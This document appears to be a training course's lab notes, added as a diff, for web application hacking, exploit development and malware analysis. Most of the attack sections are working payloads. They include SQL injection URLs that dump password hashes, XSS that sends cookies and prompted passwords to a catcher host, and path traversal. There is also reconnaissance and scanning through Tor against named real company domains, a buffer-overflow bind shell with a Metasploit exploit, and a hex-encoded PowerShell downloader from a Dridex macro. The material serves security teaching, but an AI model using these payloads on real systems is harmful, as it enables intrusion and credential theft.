@@ -1,0 +1,1283 @@
+Secure Software Development
+https://s3.amazonaws.com/StrategicSec-Files/SecureSoftwareDevelopment.zip
+
+
+
+
+########################
+# Down & Dirty App Sec #
+########################
+
+Download VMWare Player if you are not currently running a version of Vmware that is newer than VMWare Workstation 11, Vmware Fusion 7, or Vmware Player 11. VMWare Player is free and you download it from here:
+https://my.vmware.com/web/vmware/free#desktop_end_user_computing/vmware_workstation_player/12_0
+
+
+
+Download the course virtual machines:
+https://s3.amazonaws.com/StrategicSec-VMs/StrategicsecUbuntu14.zip
+username:    strategicsec
+password:    strategicsec
+
+
+
+Start with simple Firefox Addons:
+
+- ShowIP			https://addons.mozilla.org/en-US/firefox/addon/showip/
+- Server Spy			https://addons.mozilla.org/en-US/firefox/addon/server-spy/
+- FoxyProxy			https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
+- Tamper Data			https://addons.mozilla.org/en-US/firefox/addon/tamper-data/
+- Wapalyzer			https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/
+
+A good list of web app testing add ons for Firefox:
+https://addons.mozilla.org/en-us/firefox/collections/adammuntner/webappsec/
+
+
+
+
+
+
+
+##################################
+# Basic: Web Application Testing #
+##################################
+
+Most people are going to tell you reference the OWASP Testing guide.
+https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents
+
+I'm not a fan of it for the purpose of actual testing. It's good for defining the scope of an assessment, and defining attacks, but not very good for actually attacking a website.
+
+
+The key to doing a Web App Assessment is to ask yourself the 3 web questions on every page in the site.
+	
+	1. Does the website talk to a DB?
+		- Look for parameter passing (ex: site.com/page.php?id=4)
+		- If yes - try SQL Injection
+
+	2. Can I or someone else see what I type?
+		- If yes - try XSS
+
+	3. Does the page reference a file?
+		- If yes - try LFI/RFI
+
+Let's start with some manual testing against 54.149.82.150
+
+
+Start here:
+http://54.149.82.150/
+
+
+There's no parameter passing on the home page so the answer to question 1 is NO.
+There is however a search box in the top right of the webpage, so the answer to question 2 is YES.
+
+Try an XSS in the search box on the home page:
+<script>alert(123);</script>
+
+Doing this gives us the following in the address bar:
+http://54.149.82.150/BasicSearch.aspx?Word=<script>alert(123);</script>
+
+Ok, so we've verified that there is XSS in the search box. 
+
+Let's move on to the search box in the left of the page.
+
+Let's give the newsletter signup box a shot
+
+Moving on to the login page.
+http://54.149.82.150/login.aspx
+
+I entered a single quote (') for both the user name and the password. I got the following error:
+
+Let's try throwing a single quote (') in there:
+
+http://54.149.82.150/bookdetail.aspx?id=2'
+
+
+I get the following error:
+
+Unclosed quotation mark after the character string ''.
+Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code.
+
+Exception Details: System.Data.SqlClient.SqlException: Unclosed quotation mark after the character string ''.
+
+
+
+
+
+
+
+
+
+
+#############################################################################
+# SQL Injection                                                             #
+# https://s3.amazonaws.com/StrategicSec-Files/1-Intro_To_SQL_Intection.pptx #
+#############################################################################
+
+
+- Another quick way to test for SQLI is to remove the paramter value
+
+ 
+#############################
+# Error-Based SQL Injection #
+#############################
+http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(0))--
+http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(1))--
+http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(2))--
+http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(3))--
+http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(4))--
+http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(N))-- 	NOTE: "N" - just means to keep going until you run out of databases
+http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85))--
+http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85) and name>'bookmaster')--
+http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85) and name>'sysdiagrams')--
+
+
+
+
+#############################
+# Union-Based SQL Injection #
+#############################
+http://54.149.82.150/bookdetail.aspx?id=2 order by 100--
+http://54.149.82.150/bookdetail.aspx?id=2 order by 50--
+http://54.149.82.150/bookdetail.aspx?id=2 order by 25--
+http://54.149.82.150/bookdetail.aspx?id=2 order by 10--
+http://54.149.82.150/bookdetail.aspx?id=2 order by 5--
+http://54.149.82.150/bookdetail.aspx?id=2 order by 6--
+http://54.149.82.150/bookdetail.aspx?id=2 order by 7--
+http://54.149.82.150/bookdetail.aspx?id=2 order by 8--
+http://54.149.82.150/bookdetail.aspx?id=2 order by 9--
+http://54.149.82.150/bookdetail.aspx?id=2 union all select 1,2,3,4,5,6,7,8,9--
+
+	We are using a union select statement because we are joining the developer's query with one of our own.
+	Reference: 
+	http://www.techonthenet.com/sql/union.php
+	The SQL UNION operator is used to combine the result sets of 2 or more SELECT statements. 
+	It removes duplicate rows between the various SELECT statements.
+
+	Each SELECT statement within the UNION must have the same number of fields in the result sets with similar data types.
+
+http://54.149.82.150/bookdetail.aspx?id=-2 union all select 1,2,3,4,5,6,7,8,9--
+
+	Negating the paramter value (changing the id=2 to id=-2) will force the pages that will echo back data to be displayed.
+
+http://54.149.82.150/bookdetail.aspx?id=-2 union all select 1,user,@@version,4,5,6,7,8,9--
+http://54.149.82.150/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,7,8,9--
+http://54.149.82.150/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,db_name(0),8,9--
+http://54.149.82.150/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,master.sys.fn_varbintohexstr(password_hash),8,9 from master.sys.sql_logins--
+
+
+
+
+
+- Another way is to see if you can get the backend to perform an arithmetic function
+http://54.149.82.150/bookdetail.aspx?id=(2)	
+http://54.149.82.150/bookdetail.aspx?id=(4-2)	
+http://54.149.82.150/bookdetail.aspx?id=(4-1)
+
+
+
+http://54.149.82.150/bookdetail.aspx?id=2 or 1=1-- 
+http://54.149.82.150/bookdetail.aspx?id=2 or 1=2-- 
+http://54.149.82.150/bookdetail.aspx?id=1*1 
+http://54.149.82.150/bookdetail.aspx?id=2 or 1 >-1# 
+http://54.149.82.150/bookdetail.aspx?id=2 or 1<99# 
+http://54.149.82.150/bookdetail.aspx?id=2 or 1<>1# 
+http://54.149.82.150/bookdetail.aspx?id=2 or 2 != 3-- 
+http://54.149.82.150/bookdetail.aspx?id=2 &0#
+
+
+
+
+
+###############################
+# Blind SQL Injection Testing #
+###############################
+Time-Based BLIND SQL INJECTION - EXTRACT DATABASE USER
+  	 
+3 - Total Characters
+http://54.149.82.150/bookdetail.aspx?id=2; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--
+http://54.149.82.150/bookdetail.aspx?id=2; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--
+http://54.149.82.150/bookdetail.aspx?id=2; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'-- 		(Ok, the username is 3 chars long - it waited 10 seconds)
+
+Let's go for a quick check to see if it's DBO
+http://54.149.82.150/bookdetail.aspx?id=2; IF ((USER)='dbo') WAITFOR DELAY '00:00:10'--
+
+Yup, it waited 10 seconds so we know the username is 'dbo' - let's give you the syntax to verify it just for fun.
+
+D  - 1st Character
+http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=97) WAITFOR DELAY '00:00:10'-- 	
+http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=98) WAITFOR DELAY '00:00:10'--
+http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=99) WAITFOR DELAY '00:00:10'--
+http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=100) WAITFOR DELAY '00:00:10'-- 	(Ok, first letter is a 100 which is the letter 'd' - it waited 10 seconds)
+ 
+B - 2nd Character
+http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),2,1)))>97) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
+http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
+ 
+O - 3rd Character
+http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>97) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
+http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>115) WAITFOR DELAY '00:00:10'--
+http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>105) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
+http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>110) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
+http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=109) WAITFOR DELAY '00:00:10'--
+http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=110) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
+
+
+
+
+
+
+
+
+
+
+###################################################################
+# What is XSS                                                     #
+# https://s3.amazonaws.com/StrategicSec-Files/2-Intro_To_XSS.pptx #
+###################################################################
+
+OK - what is Cross Site Scripting (XSS)
+
+1. Use Firefox to browse to the following location:
+
+	http://54.172.112.249/xss_practice/
+
+	A really simple search page that is vulnerable should come up. 
+
+
+
+
+2. In the search box type:
+	
+	<script>alert('So this is XSS')</script>
+
+
+	This should pop-up an alert window with your message in it proving XSS is in fact possible.
+	Ok, click OK and then click back and go back to http://54.172.112.249/xss_practice/
+
+
+3. In the search box type:
+	
+	<script>alert(document.cookie)</script>
+
+
+	This should pop-up an alert window with your message in it proving XSS is in fact possible and your cookie can be accessed.
+	Ok, click OK and then click back and go back to http://54.172.112.249/xss_practice/
+
+4. Now replace that alert script with:
+
+	<script>document.location="http://54.172.112.249/xss_practice/cookie_catcher.php?c="+document.cookie</script> 
+
+
+This will actually pass your cookie to the cookie catcher that we have sitting on the webserver.
+
+
+5. Now view the stolen cookie at:
+	http://54.172.112.249/xss_practice/cookie_stealer_logs.html
+
+
+The cookie catcher writes to this file and all we have to do is make sure that it has permissions to be written to.
+
+
+
+
+
+
+############################
+# A Better Way To Demo XSS #
+############################
+
+
+Let's take this to the next level. We can modify this attack to include some username/password collection. Paste all of this into the search box.
+
+
+Use Firefox to browse to the following location:
+
+	http://54.172.112.249/xss_practice/
+
+
+
+Paste this in the search box
+----------------------------
+
+
+Option 1
+--------
+
+<script>
+password=prompt('Your session is expired. Please enter your password to continue',' '); 
+document.write("<img src=\"http://54.172.112.249/xss_practice/passwordgrabber.php?password=" +password+"\">");
+</script>
+
+
+Now view the stolen cookie at:
+	http://54.172.112.249/xss_practice/passwords.html
+
+
+
+Option 2
+--------
+<script>
+username=prompt('Please enter your username',' ');
+password=prompt('Please enter your password',' ');
+document.write("<img src=\"http://54.172.112.249/xss_practice/unpw_catcher.php?username="+username+"&password="+password+"\">");
+</script>
+
+
+
+
+Now view the stolen cookie at:
+http://54.172.112.249/xss_practice/username_password_logs.html
+
+
+
+
+#########################################
+# Let's kick it up a notch with ASP.NET #
+# http://54.200.178.220/                #
+#########################################
+
+
+The trading Web App is on http://54.200.178.220/
+
+
+Try the following in the search box:
+	<script>alert(123);</script>
+	' or 1=1
+	' and a=a
+	1=1
+	Joe'+OR+1=1;--
+
+
+	<script>alert(123);</script>
+	
+Open a new tab in firefox and try this:
+	http://54.200.178.220/Searchresult.aspx?<script>alert(123);</script>=ScriptName
+
+
+Try the contact us form.
+Open a new tab in firefox and try this:
+	http://54.200.178.220/OpenPage.aspx?filename=../../../../../../windows/win.ini
+
+Try this on the inquiry form:
+	Joe McCray
+	1234567890
+	joe@strategicsec.com') waitfor delay '00:00:10'--
+
+
+Login Box:
+
+	' or 1=1 or ''='
+	anything   			(click login instead of pressing enter)
+
+
+
+Tamper Data: (notice 2 session IDs)
+
+	AcmeTrading=a4b796687b846dd4a34931d708c62b49; 		SessionID is md5
+	IsAdmin=yes; 
+	ASP.NET_SessionId=d10dlsvaq5uj1g550sotcg45
+
+
+
+Profile - Detail	(tamper data)
+	Disposition: form-data; name="ctl00$contentMiddle$HiddenField1"\r\n\r\njoe\r\n
+	joe|set
+
+
+	xss_upload.txt (Upload Bulk Order)
+	<script>alert(123);</script>
+
+
+
+
+###############################
+# How much fuzzing is enough? #
+###############################
+There really is no exact science for determining the correct amount of fuzzing per parameter to do before moving on to something else.
+
+Here are the steps that I follow when I'm testing (my mental decision tree) to figure out how much fuzzing to do.
+
+
+Step 1: Ask yourself the 3 questions per page of the site.
+
+Step 2: If the answer is yes, then go down that particular attack path with a few fuzz strings (I usually do 10-20 fuzz strings per parameter)
+
+Step 3: When you load your fuzz strings - use the following decision tree
+
+	- Are the fuzz strings causing a default error message (example 404)?
+		- If this is the case then it is most likely NOT vulnerable
+
+	- Are the fuzz strings causing a WAF or LB custom error message?
+		- If this is the case then you need to find an encoding method to bypass
+
+
+	- Are the fuzz strings causing an error message that discloses the backend type?
+		- If yes, then identify DB type and find correct syntax to successfully exploit
+		- Some example strings that I use are:
+			'
+			"
+			()       	<----- Take the parameter value and put it in parenthesis
+			(5-1)	 	<----- See if you can perform an arithmetic function
+
+
+	- Are the fuzz strings rendering executable code?
+		- If yes, then report XSS/CSRF/Response Splitting/Request Smuggling/etc
+		- Some example strings that I use are:
+			<b>hello</b>
+			<u>hello</u>
+			<script>alert(123);</script>
+			<script>alert(xss);</script>
+			<script>alert('xss');</script>
+			<script>alert("xss");</script>
+
+
+		
+
+
+
+############################
+# Trading Web App with WAF #
+# http://54.213.131.105    #
+############################
+
+
+Try the following in the search box:
+	<script>alert(123);</script>
+	<script>alert(123);</script
+	<script>alert(123)
+	<script>alert
+	<script>
+	<script
+	<scrip
+	<scri
+	<scr
+	<sc
+	<s
+	<p
+	<
+	< s
+	Joe'+OR+1=1;--
+
+	
+Open a new tab in firefox and try this:
+	http://54.213.131.105/Searchresult.aspx?%u003cscript>prompt(123)%u003c/script>=ScriptName
+
+
+	xss_upload.txt (Upload Bulk Order)
+	<script>alert(123);</script>
+
+
+Login Box:
+
+	' or 1=1 or ''='
+	anything
+
+
+
+Tamper Data: (notice 2 session IDs)
+
+	AcmeTrading=a4b796687b846dd4a34931d708c62b49; 		SessionID is md5
+	IsAdmin=yes; 
+	ASP.NET_SessionId=d10dlsvaq5uj1g550sotcg45
+
+
+
+Profile - Detail	(tamper data)
+	Disposition: form-data; name="ctl00$contentMiddle$HiddenField1"\r\n\r\njoe\r\n
+	joe|set
+
+
+
+
+
+
+
+###########################################################
+# Attacking an Oracle/JSP based WebApp with SQL Injection #
+###########################################################
+
+
+
+
+
+http://54.69.156.253:8081/bookcompany/
+
+
+user:	a' OR 'a'='a
+pass:	a' OR 'a'='a
+
+
+
+
+
+
+
+http://54.69.156.253:8081/bookcompany/author.jsp?id=111
+
+
+[ Search by Username ]	Joe' OR 'a'='a
+
+
+
+
+
+
+
+
+
+
+
+
+http://54.69.156.253:8081/bookcompany/faq.jsp?id=111&qid=1
+
+
+
+http://54.69.156.253:8081/bookcompany/faq.jsp?id=111&qid=1' OR '1'='1
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+http://54.69.156.253:8081/bookcompany/faq.jsp?id=111&qid=1' or 1=utl_inaddr.get_host_address((select banner from v$version where rownum=1))--
+
+
+Host is running:
+
+
+
+
+
+http://54.69.156.253:8081/bookcompany/faq.jsp?id=111&qid=1' or 1=utl_inaddr.get_host_address((SELECT user FROM dual))--
+
+User is:
+
+
+
+
+
+http://54.69.156.253:8081/bookcompany/faq.jsp?id=111&qid=1' or 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name))--
+
+Current database is:
+
+
+
+
+
+
+
+###################################################
+# Day 1: Identifying External Security Mechanisms #
+###################################################
+
+sudo /sbin/iptables -F
+cd /home/strategicsec/toolz
+
+
+
+###########################
+# Target IP Determination #
+###########################
+
+perl blindcrawl.pl -d motorola.com
+
+-- Take each IP address and look ip up here:
+http://www.networksolutions.com/whois/index.jsp
+
+cd ~/toolz/fierce2
+fierce -dns motorola.com
+cd ..
+
+Zone Transfer fails on most domains, but here is an example of one that works:
+dig axfr heartinternet.co.uk  @ns.heartinternet.co.uk
+
+
+cd ~/toolz/
+./ipcrawl 148.87.1.1 148.87.1.254				(DNS forward lookup against an IP range)
+
+
+sudo nmap -sL 148.87.1.0-255
+sudo nmap -sL 148.87.1.0-255 | grep oracle
+
+sudo nmap -p 443,444,8443,8080,8088 --script=ssl-cert --open 148.87.1.0-255		Reference: http://blog.depthsecurity.com/2012/01/obtaining-hostdomain-names-through-ssl.html
+
+
+
+###########################
+# Load Balancer Detection #
+###########################
+
+Here are some options to use for identifying load balancers:
+	- news.netcraft.com
+	- Firefox LiveHTTP Headers
+
+
+Here are some command-line options to use for identifying load balancers:
+
+dig google.com
+
+cd ~/toolz
+./lbd-0.1.sh google.com
+
+
+halberd microsoft.com
+halberd motorola.com
+halberd oracle.com
+
+
+##################################
+# Intrusion Prevention Detection #
+##################################
+
+
+osstmm-afd -P HTTP -t www.strategicsec.com -v
+
+cat /etc/xinetd.d/ssltest
+
+cat /home/strategicsec/toolz/ssl_proxy.sh
+
+service xinetd status
+
+osstmm-afd -P HTTP -t 127.0.0.1 -p 8888 -v
+
+****** If you are getting your IP blocked you can use a service like AceVPN to give you multiple IPs to launches your tests from. ******
+
+
+
+######################################
+# Web Application Firewall Detection #
+######################################
+
+cd ~/toolz/wafw00f
+python wafw00f.py http://www.oracle.com
+python wafw00f.py http://www.strategicsec.com
+
+
+cd ~/toolz/
+sudo nmap -p 80 --script http-waf-detect.nse oracle.com
+
+sudo nmap -p 80 --script http-waf-detect.nse healthcare.gov
+
+
+
+
+#######################################################
+# Day 1: 3rd Party Scanning, and scanning via proxies #
+#######################################################
+
+http://www.shodanhq.com/
+
+	Create a FREE account and login
+
+	net:129.188.8.0/24
+
+
+
+cd /home/strategicsec/toolz/
+perl proxyfinder-0.3.pl multiproxy 3 proxies.txt	<-- This takes a long time to run
+
+
+
+sudo vi /etc/proxychains.conf				<--- Make sure that last line of the file is: ocks4  127.0.0.1 9050
+
+
+
+
+----------------------------------------------------------------------
+vi ~/toolz/fix-proxychains-dns.sh
+
+#!/bin/bash
+# This script is called by proxychains to resolve DNS names
+# DNS server used to resolve names
+# Reference: http://carnal0wnage.attackresearch.com/2013/09/changing-proxychains-hardcoded-dns.html
+DNS_SERVER=4.2.2.2
+
+if [ $# = 0 ] ; then
+echo " usage:"
+echo " proxyresolv <hostname> "
+exit
+fi
+
+export LD_PRELOAD=libproxychains.so.3
+dig $1 @$DNS_SERVER +tcp | awk '/A.+[0-9]+\.[0-9]+\.[0-9]/{print $5;}'
+-----------------------------------------------------------------------
+
+
+sudo ntpdate pool.ntp.org
+
+tor-resolve strategicsec.com
+
+proxychains nmap -sT -p80 204.244.123.113
+
+proxychains nmap -sT -PN -n -sV -p 21,22,23,25,80,110,139,443,445,1433,1521,3306,3389,8080,10000 204.244.123.113
+
+
+If you want to block tor exit nodes you get a list from here:
+http://rules.emergingthreats.net/blockrules/emerging-tor-BLOCK.rules
+
+You probably should also block things like:
+http://rules.emergingthreats.net/blockrules/emerging-rbn-BLOCK.rules			<----- Russian Business Network IPs
+http://rules.emergingthreats.net/blockrules/emerging-botcc.rules			<----- BotNet Command and Control Servers
+http://rules.emergingthreats.net/blockrules/emerging-rbn-malvertisers-BLOCK.rules	<----- Malware Advertisers
+
+Here is where you can download the perl script to automatically update your firewall each day (create a cron job for it).
+http://doc.emergingthreats.net/bin/view/Main/EmergingFirewallRules
+
+
+
+
+
+
+
+######################
+# Simple Exploit Dev #
+######################
+ 
+- Inside of your Windows7 VM - download the following file to the Desktop:
+https://s3.amazonaws.com/StrategicSec-Files/SimpleExploitLab.zip
+ 
+- Extract this zip file to your Desktop
+ 
+- Go to folder C:\Users\Workshop\Desktop\ExploitLab\2-VulnServer, and run vulnserv.exe
+ 
+- Open a new command prompt and type:
+nc localhost 9999
+ 
+- In the new command prompt window where you ran nc type:
+HELP
+ 
+- Go to folder C:\Users\Workshop\Desktop\ExploitLab\4-AttackScripts
+- Right-click on 1-simplefuzzer.py and choose the option edit with notepad++
+ 
+- Now double-click on 1-simplefuzzer.py
+- You'll notice that vulnserv.exe crashes. Be sure to note what command and the number of As it crashed on.
+ 
+ 
+- Restart vulnserv, and run 1-simplefuzzer.py again. Be sure to note what command and the number of As it crashed on.
+ 
+- Now go to folder C:\Users\Workshop\Desktop\ExploitLab\3-OllyDBG and start OllyDBG. Choose 'File' -> 'Attach' and attach to process vulnserv.exe
+ 
+- Go back to folder C:\Users\Workshop\Desktop\ExploitLab\4-AttackScripts and double-click on 1-simplefuzzer.py.
+ 
+- Take note of the registers (EAX, ESP, EBP, EIP) that have been overwritten with As (41s).
+ 
+- Now isolate the crash by restarting your debugger and running script 2-3000chars.py
+ 
+- Calculate the distance to EIP by running script 3-3000chars.py
+- This script sends 3000 nonrepeating chars to vulserv.exe and populates EIP with the value: 396F4338
+ 
+4-count-chars-to-EIP.py
+- In the previous script we see that EIP is overwritten with 396F4338 is 8 (38), C (43), o (6F), 9 (39)
+- so we search for 8Co9 in the string of nonrepeating chars and count the distance to it
+ 
+5-2006char-eip-check.py
+- In this script we check to see if our math is correct in our calculation of the distance to EIP by overwriting EIP with 42424242
+ 
+6-jmp-esp.py
+- In this script we overwrite EIP with a JMP ESP (6250AF11) inside of essfunc.dll
+ 
+7-first-exploit
+- In this script we actually do the stack overflow and launch a bind shell on port 4444
+ 
+8 - Take a look at the file vulnserv.rb and place it in your Ubuntu host via SCP or copy it and paste the code into the host.
+ 
+ 
+------------------------------
+ 
+cd /home/strategicsec/toolz/metasploit/modules/exploits/windows/misc
+ 
+vi vulnserv.rb
+ 
+ 
+ 
+cd ~/toolz/metasploit
+ 
+./msfconsole
+ 
+ 
+ 
+use exploit/windows/misc/vulnserv
+set PAYLOAD windows/meterpreter/bind_tcp
+set RHOST 192.168.153.133
+set RPORT 9999
+exploit
+
+
+
+
+###############################
+# InfoSec Program Development #
+###############################
+Download this file for program development walk-through:
+https://s3.amazonaws.com/StrategicSec-Files/Build-InfoSec-Assessment-Capability.zip
+
+
+
+
+
+
+
+############################
+# Download the Analysis VM #
+############################
+https://s3.amazonaws.com/StrategicSec-VMs/StrategicsecUbuntu-v3.zip
+user: malware
+pass: malware
+
+
+- Log in to your Ubuntu system with the username 'malware' and the password 'malware'.
+
+- After logging please open a terminal window and type the following commands:
+
+cd Desktop/
+
+
+- This is actual Malware (remmeber to run it in a VM - the password to extract it is 'infected':
+
+wget https://s3.amazonaws.com/StrategicSec-Files/MalwareAnalysis/malware-password-is-infected.zip
+wget https://s3.amazonaws.com/StrategicSec-Files/analyse_malware.py
+
+unzip malware-password-is-infected.zip
+	infected
+
+file malware.exe
+
+mv malware.exe malware.pdf
+
+file malware.pdf
+
+mv malware.pdf malware.exe
+ 
+hexdump -n 2 -C malware.exe
+ 
+***What is '4d 5a' or 'MZ'***
+Reference: 
+http://www.garykessler.net/library/file_sigs.html
+ 
+
+objdump -x malware.exe
+ 
+strings malware.exe
+
+strings --all malware.exe | head -n 6
+ 
+strings malware.exe | grep -i dll
+ 
+strings malware.exe | grep -i library
+
+strings malware.exe | grep -i reg
+
+strings malware.exe | grep -i hkey
+
+strings malware.exe | grep -i hku
+
+							- We didn't see anything like HKLM, HKCU or other registry type stuff
+
+strings malware.exe | grep -i irc
+
+strings malware.exe | grep -i join			
+
+strings malware.exe | grep -i admin
+
+strings malware.exe | grep -i list
+
+
+							- List of IRC commands: https://en.wikipedia.org/wiki/List_of_Internet_Relay_Chat_commands
+
+sudo apt-get install -y python-pefile
+
+vi analyse_malware.py
+
+python analyse_malware.py malware.exe
+
+
+
+
+Building a Malware Scanner
+--------------------------
+
+mkdir ~/Desktop/malwarescanner
+
+cd ~/Desktop/malwarescanner
+
+wget https://github.com/jonahbaron/malwarescanner/archive/master.zip
+
+unzip master.zip
+
+cd malwarescanner-master/
+
+python scanner.py -h
+
+cat strings.txt
+
+cat hashes.txt
+
+mkdir ~/Desktop/malcode
+
+cp ~/Desktop/malware.exe ~/Desktop/malcode
+
+python scanner.py -H hashes.txt -D /home/malware/Desktop/malcode/ strings.txt
+
+cp ~/Desktop/
+
+
+
+#####################################################
+# Analyzing Macro Embedded Malware                  #
+# Reference:                                        #
+# https://jon.glass/analyzes-dridex-malware-p1/     #
+#####################################################
+cp ~/Desktop/
+
+- Create a FREE account on:
+https://malwr.com/account/signup/
+
+- Grab the malware from:
+https://malwr.com/analysis/MzkzMTk3MzBlZGQ2NDRhY2IyNTc0MGI5MWQwNzEwZmQ/
+
+file ~/Downloads/f9b874f9ccf803abaeaaf7af93523ee140f1929837f267378c89ed7b5bf174bf.bin
+
+cat ~/Downloads/f9b874f9ccf803abaeaaf7af93523ee140f1929837f267378c89ed7b5bf174bf.bin
+
+
+
+
+sudo pip install olefile
+
+mkdir ~/Desktop/oledump
+
+cd ~/Desktop/oledump
+
+wget http://didierstevens.com/files/software/oledump_V0_0_22.zip
+
+unzip oledump_V0_0_22.zip
+
+cp ~/Downloads/f9b874f9ccf803abaeaaf7af93523ee140f1929837f267378c89ed7b5bf174bf.bin .
+
+mv f9b874f9ccf803abaeaaf7af93523ee140f1929837f267378c89ed7b5bf174bf.bin 064016.doc
+
+python oledump.py 064016.doc
+
+python oledump.py 064016.doc -s A4 -v
+
+- From this we can see this Word doc contains an embedded file called editdata.mso which contains seven data streams. 
+- Three of the data streams are flagged as macros: A3:’VBA/Module1′, A4:’VBA/Module2′, A5:’VBA/ThisDocument’. 
+
+
+python oledump.py 064016.doc -s A5 -v
+
+- As far as I can tell, VBA/Module2 does absolutely nothing. These are nonsensical functions designed to confuse heuristic scanners.
+
+
+python oledump.py 064016.doc -s A3 -v
+
+- Look for "GVhkjbjv" and you should see: 
+
+636D64202F4B20706F7765727368656C6C2E657865202D457865637574696F6E506F6C69637920627970617373202D6E6F70726F66696C6520284E65772D4F626A6563742053797374656D2E4E65742E576562436C69656E74292E446F776E6C6F616446696C652827687474703A2F2F36322E37362E34312E31352F6173616C742F617373612E657865272C272554454D50255C4A494F696F646668696F49482E63616227293B20657870616E64202554454D50255C4A494F696F646668696F49482E636162202554454D50255C4A494F696F646668696F49482E6578653B207374617274202554454D50255C4A494F696F646668696F49482E6578653B
+
+- Take that long blob that starts with 636D and finishes with 653B and paste it in:
+http://www.rapidtables.com/convert/number/hex-to-ascii.htm
+
+
+
+
+##############
+# Yara Ninja #
+##############
+sudo apt-get remove -y yara
+
+wget https://github.com/plusvic/yara/archive/v3.4.0.zip
+
+sudo apt-get -y install libtool
+
+unzip v3.4.0.zip
+
+cd yara-3.4.0
+
+./bootstrap.sh
+
+./configure
+
+make
+
+sudo make install
+
+yara -v
+
+cd ..
+
+wget https://github.com/Yara-Rules/rules/archive/master.zip
+
+unzip master.zip
+
+cd ~/Desktop
+
+yara rules-master/packer.yar malcode/malware.exe
+
+
+Places to get more Yara rules:
+------------------------------
+https://malwareconfig.com/static/yaraRules/
+https://github.com/kevthehermit/YaraRules
+https://github.com/VectraThreatLab/reyara
+
+
+
+Yara rule sorting script:
+-------------------------
+https://github.com/mkayoh/yarasorter
+
+
+
+cd ~/Desktop/rules-master
+for i in $( ls --hide=master.yar ); do echo include \"$i\";done > master.yar
+cd ~/Desktop/
+yara rules-master/master.yar malcode/malware.exe
+
+
+
+
+
+
+
+
+
+
+Here is a 2 million sample malware DB created by Derek Morton that you can use to start your DB with:
+http://derekmorton.name/files/malware_12-14-12.sql.bz2
+
+
+Malware Repositories:
+http://malshare.com/index.php
+http://www.malwareblacklist.com/
+http://www.virusign.com/
+http://virusshare.com/
+http://www.tekdefense.com/downloads/malware-samples/
+
+
+
+
+###############################
+# Creating a Malware Database #
+###############################
+
+Creating a malware database (sqlite)
+------------------------------------
+sudo apt-get install -y python-simplejson python-simplejson-dbg
+wget https://malwarecookbook.googlecode.com/svn/trunk/4/4/avsubmit.py
+wget https://s3.amazonaws.com/StrategicSec-Files/MalwareAnalysis/malware-password-is-infected.zip
+unzip malware-password-is-infected.zip
+	infected
+python avsubmit.py --init
+python avsubmit.py -f malware.exe -e
+
+
+
+
+
+Creating a malware database (mysql)
+-----------------------------------
+- Step 1: Installing MySQL database
+- Run the following command in the terminal:
+
+sudo apt-get install mysql-server
+	 
+- Step 2: Installing Python MySQLdb module
+- Run the following command in the terminal:
+
+sudo apt-get build-dep python-mysqldb
+sudo apt-get install python-mysqldb
+
+Step 3: Logging in 
+Run the following command in the terminal:
+
+mysql -u root -p					(set a password of 'malware')
+
+- Then create one database by running following command:
+
+create database malware;
+
+exit;
+
+wget https://raw.githubusercontent.com/dcmorton/MalwareTools/master/mal_to_db.py
+
+vi mal_to_db.py						(fill in database connection information)
+
+python mal_to_db.py -i
+
+python mal_to_db.py -f malware.exe -u
+
+
+mysql -u root -p
+	malware
+
+mysql> use malware;
+
+select id,md5,sha1,sha256,time FROM files;
+
+mysql> quit;
+
+
+
+
+
+#################
+# PCAP Analysis #
+#################
+cd /home/malware/Desktop/Browser\ Forensics
+
+ls | grep pcap
+
+perl chaosreader.pl suspicious-time.pcap
+
+firefox index.html
+
+cat index.text | grep -v '"' | grep -oE "([0-9]+\.){3}[0-9]+.*\)"
+
